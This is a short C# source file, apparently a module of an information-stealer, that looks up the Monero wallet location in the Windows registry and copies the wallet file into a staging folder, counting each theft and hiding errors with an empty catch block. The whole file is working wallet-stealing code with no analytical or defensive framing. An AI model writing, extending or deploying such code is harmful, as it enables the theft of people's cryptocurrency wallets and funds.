using Microsoft.Win32;
using System.IO;

namespace SHARP
{
    internal class Monero
    {
      public static string base64xmr = "\\Wallets\\Monero\\";

      public static void XMRcoinStr(string directorypath)
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core");
          Directory.CreateDirectory(directorypath + Monero.base64xmr);
          string sourceFileName = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
          Directory.CreateDirectory(directorypath + Monero.base64xmr);
          File.Copy(sourceFileName, directorypath + Monero.base64xmr + sourceFileName.Split('\\')[sourceFileName.Split('\\').Length - 1]);
          ++Counting.monero;
          ++Counting.Wallets;
        }
        catch
        {
        }
      }
    }
}
